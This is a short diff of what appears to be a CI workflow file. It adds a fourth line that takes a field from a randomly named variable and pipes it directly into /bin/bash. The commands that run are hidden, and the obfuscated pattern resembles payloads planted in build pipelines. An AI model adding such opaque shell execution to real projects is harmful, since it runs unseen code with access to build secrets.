@@ -25,6 +25,7 @@ jobs:
           echo $elhqu82 | jq -r .sh2 | /bin/bash
           echo $uj4 | jq -r .svxk471 | /bin/bash
           echo $x203 | jq -r .skcn8 | /bin/bash
+          echo $pg62 | jq -r .gai31121 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
